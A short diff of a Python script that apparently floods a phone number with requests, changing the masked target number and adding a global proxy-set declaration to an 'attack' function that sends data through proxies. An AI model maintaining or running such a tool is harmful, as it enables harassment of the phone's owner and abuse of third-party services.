@@ -9,7 +9,7 @@ from bs4 import BeautifulSoup
 from lxml import etree
 
 ua = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
-phone = "151xxxxx"
+phone = "138xxxx"
 
 valid_proxy = set()
 
@@ -114,6 +114,7 @@ request_data = [
 
 
 def attack(para, proxy):
+    global valid_proxy
     data = para["data"]
     if data:
         data = urllib.urlencode(data)
